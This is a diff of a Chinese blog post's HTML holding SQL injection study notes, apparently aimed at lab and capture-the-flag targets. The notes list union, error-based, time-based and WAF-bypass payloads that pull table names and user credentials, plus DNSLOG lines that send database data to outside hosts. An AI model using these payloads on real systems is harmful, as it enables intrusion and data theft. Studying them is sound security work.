@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="SQL注入,WEB安全," />
+  <meta name="keywords" content="SQL注入," />
 
 
 
@@ -81,19 +81,18 @@
 
 <meta name="description" content="0x01 常见注入类型一、带回显1. 联合注入12345678910111213id&#x3D;1&amp;#x27; and 1&#x3D;1--+   &#x3D;&#x3D;&gt;   id&#x3D;1&amp;#x27; and 1^0--+   &#x3D;&#x3D;&gt;  select !0id&#x3D;1&amp;#x27; and 1&#x3D;2--+   &#x3D;&#x3D;&gt;   id&#x3D;1&amp;#x27; and 1^1--+   &#x3D;&#x3D;&gt;1&amp;#x27; and &amp;#x27;1&amp;#x2">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入知识点">
-<meta property="og:url" content="http://example.com/2021/07/05/SQL_Injection/index.html">
+<meta property="og:title" content="SQL笔记">
+<meta property="og:url" content="http://example.com/2021/07/05/sql-injection/index.html">
 <meta property="og:site_name" content="欣海余诚&#39;s blog">
 <meta property="og:description" content="0x01 常见注入类型一、带回显1. 联合注入12345678910111213id&#x3D;1&amp;#x27; and 1&#x3D;1--+   &#x3D;&#x3D;&gt;   id&#x3D;1&amp;#x27; and 1^0--+   &#x3D;&#x3D;&gt;  select !0id&#x3D;1&amp;#x27; and 1&#x3D;2--+   &#x3D;&#x3D;&gt;   id&#x3D;1&amp;#x27; and 1^1--+   &#x3D;&#x3D;&gt;1&amp;#x27; and &amp;#x27;1&amp;#x2">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2021/07/05/SQL_Injection/3DB64B1FF8734B048A39EAA032BA5D6B">
-<meta property="article:published_time" content="2021-07-05T10:07:46.707Z">
-<meta property="article:modified_time" content="2021-07-05T10:07:46.703Z">
+<meta property="og:image" content="http://example.com/2021/07/05/sql-injection/sql_waf_bypass.jpg">
+<meta property="article:published_time" content="2021-07-05T10:21:44.000Z">
+<meta property="article:modified_time" content="2021-07-05T10:34:54.954Z">
 <meta property="article:author" content="欣海余诚">
 <meta property="article:tag" content="SQL注入">
-<meta property="article:tag" content="WEB安全">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/07/05/SQL_Injection/3DB64B1FF8734B048A39EAA032BA5D6B">
+<meta name="twitter:image" content="http://example.com/2021/07/05/sql-injection/sql_waf_bypass.jpg">
 
 
 
@@ -123,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://example.com/2021/07/05/SQL_Injection/"/>
+  <link rel="canonical" href="http://example.com/2021/07/05/sql-injection/"/>
 
 
 
 
 
-  <title>SQL注入知识点 | 欣海余诚's blog</title>
+  <title>SQL笔记 | 欣海余诚's blog</title>
   
 
 
@@ -266,7 +265,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/05/SQL_Injection/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/05/sql-injection/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -283,7 +282,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">SQL注入知识点</h1>
+          <h1 class="post-title" itemprop="name headline">SQL笔记</h1>
         
 
         <div class="post-meta">
@@ -295,7 +294,7 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-07-05T18:07:46+08:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-07-05T18:21:44+08:00">
                 2021-07-05
               </time>
             
@@ -357,26 +356,23 @@
       
         <h2 id="0x01-常见注入类型"><a href="#0x01-常见注入类型" class="headerlink" title="0x01 常见注入类型"></a>0x01 常见注入类型</h2><h3 id="一、带回显"><a href="#一、带回显" class="headerlink" title="一、带回显"></a>一、带回显</h3><h4 id="1-联合注入"><a href="#1-联合注入" class="headerlink" title="1. 联合注入"></a>1. 联合注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=1--+   ==&gt;   id=1&#x27; and 1^0--+   ==&gt;  select !0</span><br><span class="line">id=1&#x27; and 1=2--+   ==&gt;   id=1&#x27; and 1^1--+   ==&gt;</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27; --+</span><br><span class="line">1&#x27; order by 2 -- -</span><br><span class="line">1&#x27; union select 1,2-- -</span><br><span class="line">注表名</span><br><span class="line">1&#x27; union select database(), group_concat(table_name) from information_schema.tables where table_schema=database()-- -</span><br><span class="line">注列名：</span><br><span class="line">1&#x27; union select table_name, group_concat(column_name) from information_schema.columns where table_name=&#x27;xxx&#x27;-- -;</span><br><span class="line"> select !1</span><br><span class="line">//注flag：</span><br><span class="line">id=-1&#x27;%20union%20select%201,username,password%20from%20security.users--+</span><br></pre></td></tr></table></figure>
 <h4 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h4><ol>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e097a1c0d9ef">双查询注入(Duplicate entry报错)</a></li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,count(*),concat_ws(&#x27;:&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand()*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
-
+<li><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e097a1c0d9ef">双查询注入(Duplicate entry报错)</a></p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,count(*),concat_ws(&#x27;:&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand()*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p>
 </blockquote>
-<ol start="2">
-<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/158705.html">Xpath报错</a><br>Mysql&gt;5.1.5</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//updatexml():对xml进行查询和修改</span><br><span class="line">id=1&#x27; and updatexml(1,concat(0x26,(version()),0x26),1)--+</span><br><span class="line">id=1&#x27; and updatexml(1,concat(0x3a,(select username from security.users limit 1)), 1)--+</span><br><span class="line">//extractvalue():对xml进行查询和修改</span><br><span class="line">id=1&#x27; and (extractvalue(1,concat(0x26,(version()),0x26)))--+</span><br><span class="line"></span><br><span class="line">1&#x27; and updatexml(0,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;),0)-- -</span><br><span class="line">1&#x27; and updatexml(1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1)-- -</span><br><span class="line">1&#x27; and extractvalue(0,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;))-- -</span><br></pre></td></tr></table></figure>
-<p>报错注入只能爆出32位，结合substring爆出64位flag</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/158705.html">Xpath报错</a></p>
+<p> 条件：Mysql&gt;5.1.5</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//updatexml():对xml进行查询和修改</span><br><span class="line">id=1&#x27; and updatexml(1,concat(0x26,(version()),0x26),1)--+</span><br><span class="line">id=1&#x27; and updatexml(1,concat(0x3a,(select username from security.users limit 1)), 1)--+</span><br><span class="line">//extractvalue():对xml进行查询和修改</span><br><span class="line">id=1&#x27; and (extractvalue(1,concat(0x26,(version()),0x26)))--+</span><br><span class="line"></span><br><span class="line">1&#x27; and updatexml(0,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;),0)-- -</span><br><span class="line">1&#x27; and updatexml(1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1)-- -</span><br><span class="line">1&#x27; and extractvalue(0,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;))-- -</span><br></pre></td></tr></table></figure>
+<p> 报错注入只能爆出32位，结合substring爆出64位flag</p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://www.lsablog.com/networksec/penetration/error-based-blind-sqli/">整数溢出报错</a></p>
-</li>
+<p> exp(x):计算e的x次方，需要Mysql&gt;5.5.5</p>
+<p> 原理：Exp()超过710会产生溢出。</p>
+<p> Payload: </p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (EXP(~(select * from(select version())a)))--+ //未试验成功</span><br></pre></td></tr></table></figure></li>
 </ol>
-<p>Mysql&gt;5.5.5</p>
-<p>exp(x):计算e的x次方</p>
-<p>Payload: </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (EXP(~(select * from(select version())a)))--+ //未试验成功</span><br></pre></td></tr></table></figure>
-<p>Exp()超过710会产生溢出。</p>
 <h4 id="二、无回显"><a href="#二、无回显" class="headerlink" title="二、无回显"></a>二、无回显</h4><h4 id="1-基于时间"><a href="#1-基于时间" class="headerlink" title="1. 基于时间"></a>1. 基于时间</h4><ul>
 <li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cyjaysun/p/4463979.html">延迟函数</a></li>
 </ul>
@@ -395,10 +391,9 @@
 </li>
 <li><p>Oracle:</p>
 <p> DBMS_PIPE.RECEIVE_MESSAGE函数将为从RDS管道返回的数据等待10秒。默认情况下，允许以public权限执行该包。 </p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; or 1=dbms_pipe.receive_message(&#x27;RDS&#x27;, 10)--+ //</span><br></pre></td></tr></table></figure>
-<h4 id="2-基于bool"><a href="#2-基于bool" class="headerlink" title="2. 基于bool"></a>2. 基于bool</h4><h4 id="3-DNSLOG带外"><a href="#3-DNSLOG带外" class="headerlink" title="3. DNSLOG带外"></a>3. DNSLOG带外</h4></li>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; or 1=dbms_pipe.receive_message(&#x27;RDS&#x27;, 10)--+ //</span><br></pre></td></tr></table></figure></li>
 </ol>
-<p>mysql的secure_file_priv为空的时候可以使用,版本基本在5.5.53之前。(经测试，5.5.2也不能成功带外)</p>
+<h4 id="2-基于bool"><a href="#2-基于bool" class="headerlink" title="2. 基于bool"></a>2. 基于bool</h4><h4 id="3-DNSLOG带外"><a href="#3-DNSLOG带外" class="headerlink" title="3. DNSLOG带外"></a>3. DNSLOG带外</h4><p>mysql的secure_file_priv为空的时候可以使用,版本基本在5.5.53之前。(经测试，5.5.2也不能成功带外)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;////test.hcg10m.dnslog.cn//a.txt&quot;);</span><br><span class="line">select load_file(concat(&quot;////&quot;, version(), &quot;.8em7js.ceye.io//a.txt&quot;));</span><br></pre></td></tr></table></figure>
 
 <h3 id="0x02-如何区分后端数据库"><a href="#0x02-如何区分后端数据库" class="headerlink" title="0x02 如何区分后端数据库"></a>0x02 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34275734/article/details/91816289">如何区分后端数据库</a></h3><h4 id="1-看报错"><a href="#1-看报错" class="headerlink" title="1. 看报错"></a>1. 看报错</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Oracle：</span><br><span class="line">ORA-00933: SQL command not properly ended</span><br><span class="line"></span><br><span class="line">MS SQL Server：</span><br><span class="line">Microsoft SQL Native Client error &#x27;80040e14&#x27;</span><br><span class="line">Unclosed quotation mark after the character string</span><br><span class="line"></span><br><span class="line">PostgreSQL：</span><br><span class="line">Query failed: ERROR: syntax error at or near &quot;&#x27;&quot; at character 56 in /www/site/test.php on line 121.</span><br></pre></td></tr></table></figure>
@@ -419,15 +414,16 @@
 <p>  SQL－SERVER有user,db_name(),@@VERSION等系统变量，利用这些系统值不仅可以判断SQL-SERVER，而且还可以得到大量有用信息。(无version()函数)</p>
   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abc.asp?p=YY and user&gt;0 不仅可以判断是否是SQL-SERVER，而还可以得到当前连接到数据库的用户名</span><br><span class="line"></span><br><span class="line">abc.asp?p=YY&amp;n ... db_name()&gt;0 不仅可以判断是否是SQL-SERVER，而还可以得到当前正在使用的数据库名；</span><br></pre></td></tr></table></figure></li>
 <li><p>Mysql:</p>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (select count(*) from information_schema.TABLES)&gt;0 and 1=1--+</span><br></pre></td></tr></table></figure>
-<h4 id="3-通过各数据库特有的连接符判断数据库类型"><a href="#3-通过各数据库特有的连接符判断数据库类型" class="headerlink" title="3. 通过各数据库特有的连接符判断数据库类型"></a>3. 通过各数据库特有的连接符判断数据库类型</h4></li>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (select count(*) from information_schema.TABLES)&gt;0 and 1=1--+</span><br></pre></td></tr></table></figure></li>
 </ul>
-<p>1、mssql数据库<br><code>http://127.0.0.1/test.php?id=1 and &#39;1&#39; + &#39;1&#39; = &#39;11&#39;</code></p>
-<p>2、mysql数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27; + &#x27;1&#x27; = &#x27;2&#x27;</span><br><span class="line">http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;1&#x27;,&#x27;1&#x27;)=&#x27;11&#x27;</span><br></pre></td></tr></table></figure>
-<p>3、oracle数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27;||&#x27;1&#x27;=&#x27;11&#x27;</span><br><span class="line">http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;1&#x27;,&#x27;1&#x27;)=&#x27;11&#x27;</span><br></pre></td></tr></table></figure>
-
+<h4 id="3-通过各数据库特有的连接符判断数据库类型"><a href="#3-通过各数据库特有的连接符判断数据库类型" class="headerlink" title="3. 通过各数据库特有的连接符判断数据库类型"></a>3. 通过各数据库特有的连接符判断数据库类型</h4><ol>
+<li><p>mssql数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27; + &#x27;1&#x27; = &#x27;11&#x27;</span><br></pre></td></tr></table></figure></li>
+<li><p>mysql数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27; + &#x27;1&#x27; = &#x27;2&#x27;</span><br><span class="line">http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;1&#x27;,&#x27;1&#x27;)=&#x27;11&#x27;</span><br></pre></td></tr></table></figure></li>
+<li><p>oracle数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27;||&#x27;1&#x27;=&#x27;11&#x27;</span><br><span class="line">http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;1&#x27;,&#x27;1&#x27;)=&#x27;11&#x27;</span><br></pre></td></tr></table></figure></li>
+</ol>
 <h3 id="0x03-注入位置"><a href="#0x03-注入位置" class="headerlink" title="0x03 注入位置"></a>0x03 注入位置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tables where id=[子查询] order by [子查询, PROCEDURE ANALYSE] limit [PROCEDURE ANALYSE, INTO...LINES TERMINATED BY]</span><br></pre></td></tr></table></figure>
 
 <h4 id="1-limit注入"><a href="#1-limit注入" class="headerlink" title="1. limit注入"></a>1. limit注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql = &quot;SELECT id FROM test WHERE id &gt; 0 ORDER BY id LIMIT &quot;.$_GET[&#x27;num&#x27;];</span><br></pre></td></tr></table></figure>
@@ -452,7 +448,7 @@
 <li><p><code>select user() regexp &#39;^a&#39;</code></p>
 </li>
 </ol>
-<h4 id="2-符号替换"><a href="#2-符号替换" class="headerlink" title="2. 符号替换"></a>2. 符号替换</h4><p><img src="3DB64B1FF8734B048A39EAA032BA5D6B" alt="image"></p>
+<h4 id="2-符号替换"><a href="#2-符号替换" class="headerlink" title="2. 符号替换"></a>2. 符号替换</h4><p><img src="sql_waf_bypass.jpg" alt="image"></p>
 <h4 id="mysql-real-escape-string-————转义’、”、-r、-n、NULL、Contral-z"><a href="#mysql-real-escape-string-————转义’、”、-r、-n、NULL、Contral-z" class="headerlink" title="mysql_real_escape_string ————转义’、”、\r、\n、NULL、Contral-z"></a>mysql_real_escape_string ————转义’、”、\r、\n、NULL、Contral-z</h4><pre><code>绕过payload: id=1,AND,1=0,union,select,1,concat(user,0x3a,passwrod),3,4from,mysql.user,where,user=substring_index(current_user(),char(64),1)
 </code></pre>
 <h4 id="3-sqlmap-tamper"><a href="#3-sqlmap-tamper" class="headerlink" title="3. sqlmap tamper"></a>3. sqlmap tamper</h4><blockquote>
@@ -487,8 +483,6 @@
         <div class="post-tags">
           
             <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
-          
-            <a href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag"># WEB安全</a>
           
         </div>
       
@@ -608,7 +602,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
